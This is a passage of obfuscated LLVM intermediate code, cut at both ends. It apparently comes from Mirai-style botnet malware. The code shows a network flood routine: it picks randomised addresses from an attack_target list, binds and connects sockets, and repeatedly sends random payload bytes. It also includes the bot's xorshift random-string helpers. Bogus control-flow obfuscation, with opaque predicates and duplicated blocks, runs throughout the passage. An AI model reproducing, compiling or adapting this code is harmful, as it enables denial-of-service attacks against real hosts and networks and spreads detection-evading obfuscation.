  %171 = load i32, i32* @x.39
  %172 = load i32, i32* @y.40
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %170, label %179, label %196

; <label>:179:                                    ; preds = %originalBBpart212
  %180 = load i32, i32* @x.39
  %181 = load i32, i32* @y.40
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %179
  %188 = load i32, i32* @x.39
  %189 = load i32, i32* @y.40
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %196

; <label>:196:                                    ; preds = %originalBBpart216, %originalBBpart212
  %197 = load i32, i32* @x.39
  %198 = load i32, i32* @y.40
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %196
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 2
  %210 = load i8, i8* %209, align 4
  %211 = zext i8 %210 to i32
  %212 = icmp slt i32 %211, 32
  %213 = load i32, i32* @x.39
  %214 = load i32, i32* @y.40
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %212, label %221, label %263

; <label>:221:                                    ; preds = %originalBBpart220
  %222 = load i32, i32* @x.39
  %223 = load i32, i32* @y.40
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %221
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = call i32 @ntohl(i32 %235) #7
  %237 = call i32 @rand_next()
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 2
  %243 = load i8, i8* %242, align 4
  %244 = zext i8 %243 to i32
  %245 = lshr i32 %237, %244
  %246 = add i32 %236, %245
  %247 = call i32 @htonl(i32 %246) #7
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i32 0, i32 0
  %253 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %252, i32 0, i32 2
  %254 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %253, i32 0, i32 0
  store i32 %247, i32* %254, align 4
  %255 = load i32, i32* @x.39
  %256 = load i32, i32* @y.40
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart237, label %originalBB22alteredBB

originalBBpart237:                                ; preds = %originalBB22
  br label %263

; <label>:263:                                    ; preds = %originalBBpart237, %originalBBpart220
  %264 = load i32*, i32** %11, align 8
  %265 = load i32, i32* %9, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i32, i32* %264, i64 %266
  %268 = load i32, i32* %267, align 4
  %269 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %269, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i32 @connect(i32 %268, %struct.sockaddr* %277, i32 16)
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %263
  br label %281

; <label>:281:                                    ; preds = %280, %263
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  br label %74

; <label>:285:                                    ; preds = %originalBBpart24
  %286 = load i32, i32* @x.39
  %287 = load i32, i32* @y.40
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %285
  %294 = load i32, i32* @x.39
  %295 = load i32, i32* @y.40
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %302

; <label>:302:                                    ; preds = %365, %originalBBpart241
  store i32 0, i32* %9, align 4
  br label %303

; <label>:303:                                    ; preds = %originalBBpart250, %302
  %304 = load i32, i32* %9, align 4
  %305 = load i8, i8* %5, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %304, %306
  br i1 %307, label %308, label %365

; <label>:308:                                    ; preds = %303
  %309 = load i8**, i8*** %10, align 8
  %310 = load i32, i32* %9, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %22, align 8
  %314 = load i8, i8* %15, align 1
  %315 = icmp ne i8 %314, 0
  br i1 %315, label %316, label %336

; <label>:316:                                    ; preds = %308
  %317 = load i32, i32* @x.39
  %318 = load i32, i32* @y.40
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %316
  %325 = load i8*, i8** %22, align 8
  %326 = load i16, i16* %14, align 2
  %327 = zext i16 %326 to i32
  call void @rand_str(i8* %325, i32 %327)
  %328 = load i32, i32* @x.39
  %329 = load i32, i32* @y.40
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %336

; <label>:336:                                    ; preds = %originalBBpart245, %308
  %337 = load i32*, i32** %11, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds i32, i32* %337, i64 %339
  %341 = load i32, i32* %340, align 4
  %342 = load i8*, i8** %22, align 8
  %343 = load i16, i16* %14, align 2
  %344 = zext i16 %343 to i64
  %345 = call i64 @send(i32 %341, i8* %342, i64 %344, i32 16384)
  br label %346

; <label>:346:                                    ; preds = %336
  %347 = load i32, i32* @x.39
  %348 = load i32, i32* @y.40
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %346
  %355 = load i32, i32* %9, align 4
  %356 = add nsw i32 %355, 1
  store i32 %356, i32* %9, align 4
  %357 = load i32, i32* @x.39
  %358 = load i32, i32* @y.40
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBBpart250, label %originalBB47alteredBB

originalBBpart250:                                ; preds = %originalBB47
  br label %303

; <label>:365:                                    ; preds = %303
  br label %302

originalBBalteredBB:                              ; preds = %originalBB, %54
  %366 = load i16, i16* %13, align 2
  %367 = call zeroext i16 @htons(i16 zeroext %366) #7
  store i16 %367, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %368 = load i32, i32* %9, align 4
  %369 = load i8, i8* %5, align 1
  %370 = zext i8 %369 to i32
  %371 = icmp slt i32 %368, %370
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %372 = load i16, i16* %12, align 2
  %373 = call zeroext i16 @htons(i16 zeroext %372) #7
  %374 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 0
  %379 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %378, i32 0, i32 1
  store i16 %373, i16* %379, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %146
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %380, align 4
  %381 = load i16, i16* %13, align 2
  %382 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %381, i16* %382, align 2
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %384 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %383, i32 0, i32 0
  store i32 0, i32* %384, align 4
  %385 = load i32*, i32** %11, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds i32, i32* %385, i64 %387
  %389 = load i32, i32* %388, align 4
  %390 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %391 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %391, %struct.sockaddr** %390, align 8
  %392 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %393 = load %struct.sockaddr*, %struct.sockaddr** %392, align 8
  %394 = call i32 @bind(i32 %389, %struct.sockaddr* %393, i32 16) #6
  %395 = icmp eq i32 %394, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %179
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %196
  %396 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %397 = load i32, i32* %9, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i64 %398
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i32 0, i32 2
  %401 = load i8, i8* %400, align 4
  %402 = zext i8 %401 to i32
  %403 = icmp slt i32 %402, 32
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %221
  %404 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %405 = load i32, i32* %9, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 1
  %409 = load i32, i32* %408, align 4
  %410 = call i32 @ntohl(i32 %409) #7
  %411 = call i32 @rand_next()
  %412 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %413 = load i32, i32* %9, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %412, i64 %414
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i32 0, i32 2
  %417 = load i8, i8* %416, align 4
  %418 = zext i8 %417 to i32
  %_ = shl i32 %411, %418
  %_23 = sub i32 %411, %418
  %gen = mul i32 %_23, %418
  %_24 = sub i32 %411, %418
  %gen25 = mul i32 %_24, %418
  %_26 = sub i32 0, %411
  %gen27 = add i32 %_26, %418
  %_28 = sub i32 0, %411
  %gen29 = add i32 %_28, %418
  %_30 = sub i32 %411, %418
  %gen31 = mul i32 %_30, %418
  %419 = lshr i32 %411, %418
  %_32 = sub i32 0, %410
  %gen33 = add i32 %_32, %419
  %_34 = sub i32 0, %410
  %gen35 = add i32 %_34, %419
  %420 = add i32 %410, %419
  %421 = call i32 @htonl(i32 %420) #7
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 2
  %428 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %427, i32 0, i32 0
  store i32 %421, i32* %428, align 4
  br label %originalBB22

originalBB39alteredBB:                            ; preds = %originalBB39, %285
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %316
  %429 = load i8*, i8** %22, align 8
  %430 = load i16, i16* %14, align 2
  %431 = zext i16 %430 to i32
  call void @rand_str(i8* %429, i32 %431)
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %346
  %432 = load i32, i32* %9, align 4
  %_48 = shl i32 %432, 1
  %433 = add nsw i32 %432, 1
  store i32 %433, i32* %9, align 4
  br label %originalBB47
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.41
  %2 = load i32, i32* @y.42
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.41
  %31 = load i32, i32* @y.42
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_ = sub i32 0, %42
  %gen = add i32 %_, %41
  %_1 = shl i32 %42, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_2 = sub i32 %44, 8
  %gen3 = mul i32 %_2, 8
  %_4 = shl i32 %44, 8
  %_5 = sub i32 %44, 8
  %gen6 = mul i32 %_5, 8
  %_7 = sub i32 0, %44
  %gen8 = add i32 %_7, 8
  %_9 = sub i32 %44, 8
  %gen10 = mul i32 %_9, 8
  %_11 = shl i32 %44, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_12 = sub i32 %46, %45
  %gen13 = mul i32 %_12, %45
  %_14 = sub i32 %46, %45
  %gen15 = mul i32 %_14, %45
  %_16 = shl i32 %46, %45
  %_17 = sub i32 %46, %45
  %gen18 = mul i32 %_17, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_19 = sub i32 0, %51
  %gen20 = add i32 %_19, 19
  %_21 = shl i32 %51, 19
  %_22 = sub i32 %51, 19
  %gen23 = mul i32 %_22, 19
  %_24 = sub i32 0, %51
  %gen25 = add i32 %_24, 19
  %_26 = shl i32 %51, 19
  %_27 = shl i32 %51, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_28 = sub i32 %53, %52
  %gen29 = mul i32 %_28, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_30 = sub i32 %56, %55
  %gen31 = mul i32 %_30, %55
  %_32 = shl i32 %56, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %45, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %46

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %45

; <label>:21:                                     ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %21
  %25 = call i32 @rand_next()
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i16*
  store i16 %27, i16* %29, align 2
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 2
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 2
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  br label %44

; <label>:36:                                     ; preds = %21
  %37 = call i32 @rand_next()
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, -1
  store i32 %43, i32* %4, align 4
  br label %44

; <label>:44:                                     ; preds = %36, %24
  br label %45

; <label>:45:                                     ; preds = %44, %11
  br label %5

; <label>:46:                                     ; preds = %5
  %47 = load i32, i32* @x.43
  %48 = load i32, i32* @y.44
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %46
  %55 = load i32, i32* @x.43
  %56 = load i32, i32* @y.44
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %46
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %118, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %119

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %93

; <label>:15:                                     ; preds = %11
  %16 = call i32 @rand_next()
  store i32 %16, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %69, %15
  %18 = load i32, i32* @x.45
  %19 = load i32, i32* @y.46
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = icmp ult i64 %27, 4
  %29 = load i32, i32* @x.45
  %30 = load i32, i32* @y.46
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %72

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* @x.45
  %39 = load i32, i32* @y.46
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %6, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %7, align 1
  %49 = load i32, i32* %6, align 4
  %50 = lshr i32 %49, 8
  store i32 %50, i32* %6, align 4
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i32
  %53 = ashr i32 %52, 3
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %7, align 1
  %55 = load i8, i8* %7, align 1
  %56 = zext i8 %55 to i64
  %57 = getelementptr inbounds [33 x i8], [33 x i8]* @rand_alphastr.alphaset, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* @x.45
  %62 = load i32, i32* @y.46
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart220, label %originalBB1alteredBB

originalBBpart220:                                ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart220
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %5, align 4
  br label %17

; <label>:72:                                     ; preds = %originalBBpart2
  %73 = load i32, i32* @x.45
  %74 = load i32, i32* @y.46
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %72
  %81 = load i32, i32* %4, align 4
  %82 = sext i32 %81 to i64
  %83 = sub i64 %82, 4
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %4, align 4
  %85 = load i32, i32* @x.45
  %86 = load i32, i32* @y.46
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %118

; <label>:93:                                     ; preds = %11
  %94 = load i32, i32* @x.45
  %95 = load i32, i32* @y.46
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %93
  %102 = call i32 @rand_next()
  %103 = zext i32 %102 to i64
  %104 = urem i64 %103, 33
  %105 = trunc i64 %104 to i8
  %106 = load i8*, i8** %3, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %3, align 8
  store i8 %105, i8* %106, align 1
  %108 = load i32, i32* %4, align 4
  %109 = add nsw i32 %108, -1
  store i32 %109, i32* %4, align 4
  %110 = load i32, i32* @x.45
  %111 = load i32, i32* @y.46
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart236, label %originalBB26alteredBB

originalBBpart236:                                ; preds = %originalBB26
  br label %118

; <label>:118:                                    ; preds = %originalBBpart236, %originalBBpart224
  br label %8

; <label>:119:                                    ; preds = %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %17
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = icmp ult i64 %121, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %123 = load i32, i32* %6, align 4
  %_ = sub i32 0, %123
  %gen = add i32 %_, 255
  %124 = and i32 %123, 255
  %125 = trunc i32 %124 to i8
  store i8 %125, i8* %7, align 1
  %126 = load i32, i32* %6, align 4
  %_2 = sub i32 0, %126
  %gen3 = add i32 %_2, 8
  %_4 = sub i32 0, %126
  %gen5 = add i32 %_4, 8
  %127 = lshr i32 %126, 8
  store i32 %127, i32* %6, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %_6 = shl i32 %129, 3
  %_7 = sub i32 0, %129
  %gen8 = add i32 %_7, 3
  %_9 = sub i32 %129, 3
  %gen10 = mul i32 %_9, 3
  %_11 = sub i32 0, %129
  %gen12 = add i32 %_11, 3
